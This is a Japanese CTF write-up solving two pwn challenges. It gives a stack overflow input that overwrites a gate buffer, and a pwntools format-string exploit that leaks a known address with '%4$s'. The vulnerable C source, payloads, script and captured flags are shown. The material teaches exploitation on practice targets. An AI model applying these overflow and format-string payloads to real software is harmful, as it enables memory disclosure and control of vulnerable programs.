# pwn

## tkys_let_die: 100

gateにopenを渡すために、文字数を調整すると26文字でした。

```c
    char gate[6]="close";
    char name[16]="..";
    printf("You'll need permission to pass. What's your name?\n> ");
    scanf("%32[^\n]", name);
    if (strcmp(gate,"open")==0) {
        printFlag();
    }else{
        printf("Gate is %s.\n", gate);
        printf("Goodbay %s.\n", name);
    }
```

```bash
$ checksec --file=./gate
[*] 'gate'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

$ nc nc.ctf.setodanote.net 26501
                                  {} {}
                          !  !  ! II II !  !  !
                       !  I__I__I_II II_I__I__I  !
                       I_/|__|__|_|| ||_|__|__|\_I
                    ! /|_/|  |  | || || |  |  |\_|\ !
        .--.        I//|  |  |  | || || |  |  |  |\\I        .--.
       /-   \    ! /|/ |  |  |  | || || |  |  |  | \|\ !    /=   \
       \=__ /    I//|  |  |  |  | || || |  |  |  |  |\\I    \-__ /
        }  {  ! /|/ |  |  |  |  | || || |  |  |  |  | \|\ !  }  {
       {____} I//|  |  |  |  |  | || || |  |  |  |  |  |\\I {____}
 _!__!__|= |=/|/ |  |  |  |  |  | || || |  |  |  |  |  | \|\=|  |__!__!_
 _I__I__|  ||/|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|\||- |__I__I_
 -|--|--|- ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||= |--|--|-
  |  |  |  || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||  |  |  |
  |  |  |= || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||- |  |  |
 _|__|__|  ||_|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|_||  |__|__|_
 -|--|--|= ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||- |--|--|-
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
 ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

You'll need permission to pass. What's your name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAopen

 =============================

     GREAT! GATE IS OPEN!!

 >> Flag is flag{Alohomora} <<

    *-*-*-*-*-*-*-*-*-*-*-*

 =============================
```

## 1989: 200

### description

脆弱性を調査し、フラグを入手してください。

### writeup

接続すると、CWE-134が現れました。そこで、書式指定攻撃が有効だと判断し、%sや%pを打ちました。
%sの時、4個目で落ちるようになったため、%4$sの前にflag[表示されたアドレス]をリトルエンディアンで入力することでフラグがゲットできそうだと思いました。

```bash
$ nc <addr> <port>
===========================================================
   _______          ________            __ ____  _  _
  / ____\ \        / /  ____|          /_ |___ \| || |
 | |     \ \  /\  / /| |__     ______   | | __) | || |_
 | |      \ \/  \/ / |  __|   |______|  | ||__ <|__   _|
 | |____   \  /\  /  | |____            | |___) |  | |
  \_____|   \/  \/   |______|           |_|____/   |_|

==========================================================

        |
flag    | [0x5660e060] >> flag is here <<
        |

Ready >  %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Your Inpur :  0xffcc7920-0xffcc7d28-0x5660b306-0x2d702520-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-(nil)-0x677f9a5f-0xf7fbeb50
```

```python
from pwn import *
HOST='localhost'
PORT=8080

conn = remote(HOST, PORT)
conn.recvuntil(b'[')
r = conn.recvuntil(b']')[:-1]
print(r)
addr = int(r, 16).to_bytes(byteorder='little', length=4)
print(addr)

payload = addr + b'%4$s'
conn.recvuntil(b'Ready >')
conn.sendline(payload)
r = conn.recvall()
print(r)
conn.interactive()
```

```bash
[*] Closed connection to
b' Your Inpur : `\x10VVflag{Homenum_Revelio_1989}\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
// flag: flag{Homenum_Revelio_1989}
```
